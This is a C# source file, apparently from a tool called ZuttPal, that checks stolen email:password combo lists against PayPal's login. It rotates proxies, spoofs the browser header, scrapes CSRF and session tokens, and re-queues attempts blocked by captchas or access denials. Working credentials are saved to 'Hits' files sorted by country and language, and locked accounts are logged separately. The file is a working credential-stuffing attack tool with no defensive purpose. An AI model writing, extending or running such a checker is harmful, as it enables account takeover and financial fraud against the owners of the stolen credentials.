using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading;
using AuthGG;
using Leaf.xNet;
using ZuttPal;
using Console = Colorful.Console;
namespace ZuttPal
{
	internal class check1
	{
		public static string Path4;
		public static string Path3;
		public static string Path2;
		public static string Path1;
		public static string Path;
		private static ReaderWriterLockSlim locker = new ReaderWriterLockSlim();



		public static void startchecker1()
		{
			for (; ; )
			{
				while (!Checking1.Combo.IsEmpty)
				{
					using (HttpRequest httpRequest = new HttpRequest())
					{
						if (Checking1.Combo.TryDequeue(out string acc))
						{
							try
							{
								var array = acc.Split(new char[3] { ':', ';', '|' });
								var email = array[0];
								var password = array[1];
								string account = email + ":" + password;
								httpRequest.Proxy = Checking1.RandomProxies();
								httpRequest.IgnoreProtocolErrors = true;
								httpRequest.KeepAlive = true;
								httpRequest.ConnectTimeout = Program.config.timeout;
								httpRequest.SslProtocols = System.Security.Authentication.SslProtocols.Tls12;
								HttpResponse GetRequest = httpRequest.Get("https://www.paypal.com/signin?intent=checkout&ctxId=xo_ctx_1N260099DB784690P&returnUri=%2Fwebapps%2Fhermes&state=%3Fflow%3D1-P%26ulReturn%3Dtrue%26sessionID%3D446027ac9f_mdq6ntm6mty%26buttonSessionID%3D18bf75bccf_mdu6mdm6mda%26fundingSource%3Dpaypal%26buyerCountry%3DDE%26locale.x%3Den_US%26clientID%3DATnNS8DMmU3aMaa_B_vyQP1oA3f1UmmFYFlGKXRnGwHL32N_z7sd4P6WF4QdjqTuXVfLVnHZADvBQ6uX%26env%3Dsandbox%26sdkMeta%3DeyJ1cmwiOiJodHRwczovL3d3dy5wYXlwYWwuY29tL3Nkay9qcz9jbGllbnQtaWQ9QVRuTlM4RE1tVTNhTWFhX0JfdnlRUDFvQTNmMVVtbUZZRmxHS1hSbkd3SEwzMk5fejdzZDRQNldGNFFkanFUdVhWZkxWbkhaQUR2QlE2dVgmY3VycmVuY3k9RVVSJmludGVudD1jYXB0dXJlJmNvbW1pdD1mYWxzZSZ2YXVsdD1mYWxzZSZkZWJ1Zz1mYWxzZSIsImF0dHJzIjp7ImRhdGEtcGFydG5lci1hdHRyaWJ1dGlvbi1pZCI6Ik5PUF9DYXJ0X1NQQiJ9fQ%26xcomponent%3D1%26version%3D5.0.137%26token%3D1N260099DB784690P%26nxlr%3Dtrue&sdkMeta=eyJ1cmwiOiJodHRwczovL3d3dy5wYXlwYWwuY29tL3Nkay9qcz9jbGllbnQtaWQ9QVRuTlM4RE1tVTNhTWFhX0JfdnlRUDFvQTNmMVVtbUZZRmxHS1hSbkd3SEwzMk5fejdzZDRQNldGNFFkanFUdVhWZkxWbkhaQUR2QlE2dVgmY3VycmVuY3k9RVVSJmludGVudD1jYXB0dXJlJmNvbW1pdD1mYWxzZSZ2YXVsdD1mYWxzZSZkZWJ1Zz1mYWxzZSIsImF0dHJzIjp7ImRhdGEtcGFydG5lci1hdHRyaWJ1dGlvbi1pZCI6Ik5PUF9DYXJ0X1NQQiJ9fQ&locale.x=undefined_US&country.x=US&flowId=1N260099DB784690P%3A1%20Refused%20to%20load%20the%20image%20%27https%3A%2F%2Fwww.google-analytics.com%2Fr%2Fcollect%3Fv%3D1&_v=j79&aip=1&a=2055239312&t=pageview&_s=1&dl=https%3A%2F%2Fwww.sandbox.paypal.com%2Fsignin%3Fintent%3Dcheckout%26ctxId%3Dxo_ctx_1N260099DB784690P%26returnUri%3D%252Fwebapps%252Fhermes%26state%3D%253Fflow%253D1-P%2526ulReturn%253Dtrue%2526sessionID%253D446027ac9f_mdq6ntm6mty%2526buttonSessionID%253D18bf75bccf_mdu6mdm6mda%2526fundingSource%253Dpaypal%2526buyerCountry%253DDE%2526locale.x%253Den_US%2526clientID%253DATnNS8DMmU3aMaa_B_vyQP1oA3f1UmmFYFlGKXRnGwHL32N_z...flowId%3D1N260099DB784690P&ul=en&de=UTF-8&dt=Log%20in%20to%20your%20PayPal%20account&sd=24-bit&sr=1500x1000&vp=496x625&je=0&_u=ACCACUABB~&jid=1827619018&gjid=234355511&cid=1749109093.1593869135&tid=UA-53389718-12&_gid=885898316.1594541723&_r=1&cd1=1749109093.1593869135&cd3=0&cd4=https%3A%2F%2Fwww.sandbox.paypal.com%2Fsignin%3Flocale.x%3Dundefined_US&cd5=us&cd6=en_US&cd8=&cd9=&cd10=unifiedloginnodeweb&cd22=main%3Aunifiedlogin%3A%3A%3Alogin&cd25=f3aee6c416f0a4a315e3b511ffffffff&cd26=0&gtm=2oi4f0&z=54998457");
								string text2 = GetRequest.ToString();
								string sess = Regex.Match(text2, "name=\"_sessionID\" value=\"(.*?)\"").Groups[1].Value;
								string crsf = Regex.Match(text2, "csrf-token=\"(.*?)\"").Groups[1].Value;
								httpRequest.IgnoreProtocolErrors = true;
								httpRequest.AllowAutoRedirect = true;
								byte[] bytes = Encoding.ASCII.GetBytes(string.Concat(new string[]
								{
								"_csrf=",
								crsf,
								"&_sessionID=",
								sess,
								"&locale.x=en_US&processSignin=main&fn_sync_data=%257B%2522SC_VERSION%2522%253A%25222.0.1%2522%252C%2522syncStatus%2522%253A%2522data%2522%252C%2522f%2522%253A%25221N260099DB784690P%253A1%2520Refused%2520to%2520load%2520the%2520image%2520%2526%252339%253Bhttps%253A%252F%252Fwww.google-analytics.com%252Fr%252Fcollect%253Fv%253D1%2522%252C%2522s%2522%253A%2522UL_CHECKOUT_INPUT_PASSWORD%2522%252C%2522chk%2522%253A%257B%2522ts%2522%253A1609036353054%252C%2522eteid%2522%253A%255B-2109872911%252C-13314417407%252C8046539132%252C2630685593%252C-5623411977%252C-2441882592%252C-2967704115%252C-5553373075%252C4797385236%252C4433489189%252C4621649640%252C-7401867894%252C11313290678%252C-413410274%252C-2824455645%252C-4676788187%252C-7058391070%252C-1869555115%252C-7671987295%252C15432739822%252C1902513763%252C14460817163%252C-952117507%252C-134204167%252C-1309246102%252C1892122515%255D%252C%2522tts%2522%253A2225%257D%252C%2522dc%2522%253A%2522%257B%255C%2522screen%255C%2522%253A%257B%255C%2522colorDepth%255C%2522%253A24%252C%255C%2522pixelDepth%255C%2522%253A24%252C%255C%2522height%255C%2522%253A1080%252C%255C%2522width%255C%2522%253A1920%252C%255C%2522availHeight%255C%2522%253A1040%252C%255C%2522availWidth%255C%2522%253A1920%257D%252C%255C%2522ua%255C%2522%253A%255C%2522Mozilla%252F5.0%2520%28Windows%2520NT%252010.0%253B%2520Win64%253B%2520x64%29%2520AppleWebKit%252F537.36%2520%28KHTML%252C%2520like%2520Gecko%29%2520Chrome%252F87.0.4280.88%2520Safari%252F537.36%255C%2522%257D%2522%252C%2522d%2522%253A%257B%2522ts2%2522%253A%2522Di0%253A20Di1%253A35Uh%253A761%2522%252C%2522rDT%2522%253A%252216460%252C15789%252C15763%253A47221%252C46424%252C47338%253A16484%252C15688%252C15418%253A11351%252C10574%252C10263%253A36963%252C36192%252C35877%253A16469%252C15702%252C15386%253A31836%252C31074%252C30754%253A21587%252C20835%252C20509%253A26706%252C25968%252C25632%253A11334%252C10606%252C10263%253A11333%252C10610%252C10262%253A36947%252C36227%252C35878%253A26700%252C25983%252C25631%253A42066%252C41356%252C41001%253A52309%252C51608%252C51247%253A6200%252C5505%252C5139%253A36936%252C36245%252C35878%253A47178%252C46494%252C46124%253A16436%252C15759%252C15386%253A11308%252C10640%252C10262%253A18341%252C23%2522%257D%257D&otpMayflyKey=432abe27388649a881177deeaf1f291dotpChlg&intent=checkout&ads-client-context=checkout&flowId=1N260099DB784690P%3A1+Refused+to+load+the+image+%27https%3A%2F%2Fwww.google-analytics.com%2Fr%2Fcollect%3Fv%3D1&ads-client-context-data=%7B%22context_id%22%3A%7B%22context_id%22%3A%221N260099DB784690P%3A1+Refused+to+load+the+image+%27https%3A%2F%2Fwww.google-analytics.com%2Fr%2Fcollect%3Fv%3D1%22%2C%22channel%22%3A0%2C%22flow_type%22%3A%22checkout%22%7D%7D&ctxId=xo_ctx_1N260099DB784690P&showCountryDropDown=true&hideOtpLoginCredentials=true&requestUrl=%2Fsignin%3Fintent%3Dcheckout%26ctxId%3Dxo_ctx_1N260099DB784690P%26returnUri%3D%252Fwebapps%252Fhermes%26state%3D%253Fflow%253D1-P%2526ulReturn%253Dtrue%2526sessionID%253D446027ac9f_mdq6ntm6mty%2526buttonSessionID%253D18bf75bccf_mdu6mdm6mda%2526fundingSource%253Dpaypal%2526buyerCountry%253DDE%2526locale.x%253Den_US%2526clientID%253DATnNS8DMmU3aMaa_B_vyQP1oA3f1UmmFYFlGKXRnGwHL32N_z7sd4P6WF4QdjqTuXVfLVnHZADvBQ6uX%2526env%253Dsandbox%2526sdkMeta%253DeyJ1cmwiOiJodHRwczovL3d3dy5wYXlwYWwuY29tL3Nkay9qcz9jbGllbnQtaWQ9QVRuTlM4RE1tVTNhTWFhX0JfdnlRUDFvQTNmMVVtbUZZRmxHS1hSbkd3SEwzMk5fejdzZDRQNldGNFFkanFUdVhWZkxWbkhaQUR2QlE2dVgmY3VycmVuY3k9RVVSJmludGVudD1jYXB0dXJlJmNvbW1pdD1mYWxzZSZ2YXVsdD1mYWxzZSZkZWJ1Zz1mYWxzZSIsImF0dHJzIjp7ImRhdGEtcGFydG5lci1hdHRyaWJ1dGlvbi1pZCI6Ik5PUF9DYXJ0X1NQQiJ9fQ%2526xcomponent%253D1%2526version%253D5.0.137%2526token%253D1N260099DB784690P%2526nxlr%253Dtrue%26sdkMeta%3DeyJ1cmwiOiJodHRwczovL3d3dy5wYXlwYWwuY29tL3Nkay9qcz9jbGllbnQtaWQ9QVRuTlM4RE1tVTNhTWFhX0JfdnlRUDFvQTNmMVVtbUZZRmxHS1hSbkd3SEwzMk5fejdzZDRQNldGNFFkanFUdVhWZkxWbkhaQUR2QlE2dVgmY3VycmVuY3k9RVVSJmludGVudD1jYXB0dXJlJmNvbW1pdD1mYWxzZSZ2YXVsdD1mYWxzZSZkZWJ1Zz1mYWxzZSIsImF0dHJzIjp7ImRhdGEtcGFydG5lci1hdHRyaWJ1dGlvbi1pZCI6Ik5PUF9DYXJ0X1NQQiJ9fQ%26locale.x%3Dundefined_US%26country.x%3DUS%26flowId%3D1N260099DB784690P%253A1%2520Refused%2520to%2520load%2520the%2520image%2520%27https%253A%252F%252Fwww.google-analytics.com%252Fr%252Fcollect%253Fv%253D1%26_v%3Dj79%26aip%3D1%26a%3D2055239312%26t%3Dpageview%26_s%3D1%26dl%3Dhttps%253A%252F%252Fwww.sandbox.paypal.com%252Fsignin%253Fintent%253Dcheckout%2526ctxId%253Dxo_ctx_1N260099DB784690P%2526returnUri%253D%25252Fwebapps%25252Fhermes%2526state%253D%25253Fflow%25253D1-P%252526ulReturn%25253Dtrue%252526sessionID%25253D446027ac9f_mdq6ntm6mty%252526buttonSessionID%25253D18bf75bccf_mdu6mdm6mda%252526fundingSource%25253Dpaypal%252526buyerCountry%25253DDE%252526locale.x%25253Den_US%252526clientID%25253DATnNS8DMmU3aMaa_B_vyQP1oA3f1UmmFYFlGKXRnGwHL32N_z...flowId%253D1N260099DB784690P%26ul%3Den%26de%3DUTF-8%26dt%3DLog%2520in%2520to%2520your%2520PayPal%2520account%26sd%3D24-bit%26sr%3D1500x1000%26vp%3D496x625%26je%3D0%26_u%3DACCACUABB%7E%26jid%3D1827619018%26gjid%3D234355511%26cid%3D1749109093.1593869135%26tid%3DUA-53389718-12%26_gid%3D885898316.1594541723%26_r%3D1%26cd1%3D1749109093.1593869135%26cd3%3D0%26cd4%3Dhttps%253A%252F%252Fwww.paypal.com%252Fsignin%253Flocale.x%253Dundefined_US%26cd5%3Dus%26cd6%3Den_US%26cd8%3D%26cd9%3D%26cd10%3Dunifiedloginnodeweb%26cd22%3Dmain%253Aunifiedlogin%253A%253A%253Alogin%26cd25%3Df3aee6c416f0a4a315e3b511ffffffff%26cd26%3D0%26gtm%3D2oi4f0%26z%3D54998457&forcePhonePasswordOptIn=&returnUri=%2Fwebapps%2Fhermes&state=%3Fflow%3D1-P%26ulReturn%3Dtrue%26sessionID%3D446027ac9f_mdq6ntm6mty%26buttonSessionID%3D18bf75bccf_mdu6mdm6mda%26fundingSource%3Dpaypal%26buyerCountry%3DDE%26locale.x%3Den_US%26clientID%3DATnNS8DMmU3aMaa_B_vyQP1oA3f1UmmFYFlGKXRnGwHL32N_z7sd4P6WF4QdjqTuXVfLVnHZADvBQ6uX%26env%3Dsandbox%26sdkMeta%3DeyJ1cmwiOiJodHRwczovL3d3dy5wYXlwYWwuY29tL3Nkay9qcz9jbGllbnQtaWQ9QVRuTlM4RE1tVTNhTWFhX0JfdnlRUDFvQTNmMVVtbUZZRmxHS1hSbkd3SEwzMk5fejdzZDRQNldGNFFkanFUdVhWZkxWbkhaQUR2QlE2dVgmY3VycmVuY3k9RVVSJmludGVudD1jYXB0dXJlJmNvbW1pdD1mYWxzZSZ2YXVsdD1mYWxzZSZkZWJ1Zz1mYWxzZSIsImF0dHJzIjp7ImRhdGEtcGFydG5lci1hdHRyaWJ1dGlvbi1pZCI6Ik5PUF9DYXJ0X1NQQiJ9fQ%26xcomponent%3D1%26version%3D5.0.137%26token%3D1N260099DB784690P%26nxlr%3Dtrue&phoneCode=US+%2B1&login_email=",
								email,
								"&login_password=",
								password,
								"&splitLoginContext=inputPassword&isCookiedHybridEmail=true&partyIdHash=03b490ee88dfce18ed875c66fd27c317ab87c4ef4591987dec490de0e5d4c1d7"
								}));
								httpRequest.AddHeader("User-Agent", "Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko");
								httpRequest.AddHeader("Pragma", "no-cache");
								httpRequest.AddHeader("Accept", "*/*");
								string yes = email + ":" + password;
								HttpResponse PostRequest = httpRequest.Post("https://www.paypal.com/signin?intent=checkout&ctxId=xo_ctx_1N260099DB784690P&returnUri=%2Fwebapps%2Fhermes&state=%3Fflow%3D1-P%26ulReturn%3Dtrue%26sessionID%3D446027ac9f_mdq6ntm6mty%26buttonSessionID%3D18bf75bccf_mdu6mdm6mda%26fundingSource%3Dpaypal%26buyerCountry%3DDE%26locale.x%3Den_US%26clientID%3DATnNS8DMmU3aMaa_B_vyQP1oA3f1UmmFYFlGKXRnGwHL32N_z7sd4P6WF4QdjqTuXVfLVnHZADvBQ6uX%26env%3Dsandbox%26sdkMeta%3DeyJ1cmwiOiJodHRwczovL3d3dy5wYXlwYWwuY29tL3Nkay9qcz9jbGllbnQtaWQ9QVRuTlM4RE1tVTNhTWFhX0JfdnlRUDFvQTNmMVVtbUZZRmxHS1hSbkd3SEwzMk5fejdzZDRQNldGNFFkanFUdVhWZkxWbkhaQUR2QlE2dVgmY3VycmVuY3k9RVVSJmludGVudD1jYXB0dXJlJmNvbW1pdD1mYWxzZSZ2YXVsdD1mYWxzZSZkZWJ1Zz1mYWxzZSIsImF0dHJzIjp7ImRhdGEtcGFydG5lci1hdHRyaWJ1dGlvbi1pZCI6Ik5PUF9DYXJ0X1NQQiJ9fQ%26xcomponent%3D1%26version%3D5.0.137%26token%3D1N260099DB784690P%26nxlr%3Dtrue&sdkMeta=eyJ1cmwiOiJodHRwczovL3d3dy5wYXlwYWwuY29tL3Nkay9qcz9jbGllbnQtaWQ9QVRuTlM4RE1tVTNhTWFhX0JfdnlRUDFvQTNmMVVtbUZZRmxHS1hSbkd3SEwzMk5fejdzZDRQNldGNFFkanFUdVhWZkxWbkhaQUR2QlE2dVgmY3VycmVuY3k9RVVSJmludGVudD1jYXB0dXJlJmNvbW1pdD1mYWxzZSZ2YXVsdD1mYWxzZSZkZWJ1Zz1mYWxzZSIsImF0dHJzIjp7ImRhdGEtcGFydG5lci1hdHRyaWJ1dGlvbi1pZCI6Ik5PUF9DYXJ0X1NQQiJ9fQ&locale.x=undefined_US&country.x=US&flowId=1N260099DB784690P%3A1%20Refused%20to%20load%20the%20image%20%27https%3A%2F%2Fwww.google-analytics.com%2Fr%2Fcollect%3Fv%3D1&_v=j79&aip=1&a=2055239312&t=pageview&_s=1&dl=https%3A%2F%2Fwww.sandbox.paypal.com%2Fsignin%3Fintent%3Dcheckout%26ctxId%3Dxo_ctx_1N260099DB784690P%26returnUri%3D%252Fwebapps%252Fhermes%26state%3D%253Fflow%253D1-P%2526ulReturn%253Dtrue%2526sessionID%253D446027ac9f_mdq6ntm6mty%2526buttonSessionID%253D18bf75bccf_mdu6mdm6mda%2526fundingSource%253Dpaypal%2526buyerCountry%253DDE%2526locale.x%253Den_US%2526clientID%253DATnNS8DMmU3aMaa_B_vyQP1oA3f1UmmFYFlGKXRnGwHL32N_z...flowId%3D1N260099DB784690P&ul=en&de=UTF-8&dt=Log%20in%20to%20your%20PayPal%20account&sd=24-bit&sr=1500x1000&vp=496x625&je=0&_u=ACCACUABB~&jid=1827619018&gjid=234355511&cid=1749109093.1593869135&tid=UA-53389718-12&_gid=885898316.1594541723&_r=1&cd1=1749109093.1593869135&cd3=0&cd4=https%3A%2F%2Fwww.sandbox.paypal.com%2Fsignin%3Flocale.x%3Dundefined_US&cd5=us&cd6=en_US&cd8=&cd9=&cd10=unifiedloginnodeweb&cd22=main%3Aunifiedlogin%3A%3A%3Alogin&cd25=f3aee6c416f0a4a315e3b511ffffffff&cd26=0&gtm=2oi4f0&z=54998457", bytes, "application/x-www-form-urlencoded");
								var key = PostRequest.ToString();
								if (key.Contains("For security reasons, you’ll need to"))
								{
									Interlocked.Increment(ref Checking1.CheckedLines);
									Interlocked.Increment(ref Checking1.currentCpm);
									Interlocked.Increment(ref Checking1.custom);
									if (Program.config.printlocked == "True")
									{
										Console.WriteLine("[»] Locked - " + account, Color.DarkOrange);
									}
									Save(Path + "\\LOCKED.txt", account);
									break;
								}
								else if (key.Contains("adsRecaptchaSiteKey") || key.Contains("captcha code") || key.Contains("CSRF token mismatch") || key.Contains("CSRF token missing") || key.Contains("403 Forbidden") || key.Contains("Access Denied") || string.IsNullOrEmpty(key))
								{
									string acc1 = email + ":" + password;
									Checking1.Combo.Enqueue(acc1);
									Interlocked.Increment(ref Checking1.retry);
									break;
								}
								else if (key.Contains("Vérification rapide") || key.Contains("Quick security") || key.Contains("PayPal is looking") || key.Contains("We noticed some unusual"))
								{
									string t3 = PostRequest.ToString();
									Interlocked.Increment(ref Checking1.CheckedLines);
									Interlocked.Increment(ref Checking1.currentCpm);
									Interlocked.Increment(ref Checking1.Hits);
									Save(Path + "\\No Caputure Hits.txt", account);
									string country = Regex.Match(key, "country\":\"(.*?)\",").Groups[1].Value;
									string local = Regex.Match(key, "locale\":\"(.*?)\",").Groups[1].Value;
									string language = Regex.Match(key, "language\":\"(.*?)\",").Groups[1].Value;
									Save(Path2 + "\\" + country + ".txt", account);
									Save(Path3 + "\\" + local + ".txt", account);
									Save(Path4 + "\\" + language + ".txt", account);
									string boi = account + " Capture: [Language: " + language + " Local: " + local + " Country: " + country + "]";
									if (Program.config.printgood == "True")
									{
										Console.WriteLine("[»] Valid - " + boi, Color.Green);
									}
									Save(Path + "\\Capture Hits.txt", boi);
									break;
								}
								else if (key.Contains("LoginFailed"))
								{
									Interlocked.Increment(ref Checking1.CheckedLines);
									Interlocked.Increment(ref Checking1.currentCpm);
									Interlocked.Increment(ref Checking1.Bad);
									if (Program.config.printbad == "True")
									{
										Console.WriteLine("[»] Invalid - " + account, Color.Red);
									}
									break;
								}
								{
									string acc1 = email + ":" + password;
									Checking6.Combo.Enqueue(acc1);
									Interlocked.Increment(ref Checking1.retry);
								}
							}
							catch (Exception)
							{
								var array = acc.Split(new char[3] { ':', ';', '|' });
								var email = array[0];
								var password = array[1];
								var account = email + password;
								string acc1 = email + ":" + password;
								Checking1.Combo.Enqueue(acc1);
								Interlocked.Increment(ref Checking1.retry);
							}
						}
					}
				}
			}
		}

			public static void Save(string path, string line)
			{
			for (; ; )
			{
				try
				{
					File.AppendAllLines(path ?? "", new List<string>
					{
						line
					}, Encoding.UTF8);
					break;
				}
				catch
				{
				}
			}
		}

		public static string uri = "";

		public static string auther = "";

		public static string printbad = "";

		public static string printlocked = "";

		public static List<string> Tokens = new List<string>();

		public static List<string> Urls = new List<string>();

		public static List<string> Auther = new List<string>();

		public static List<ProxyClient> ProxyList = new List<ProxyClient>();
	}
}
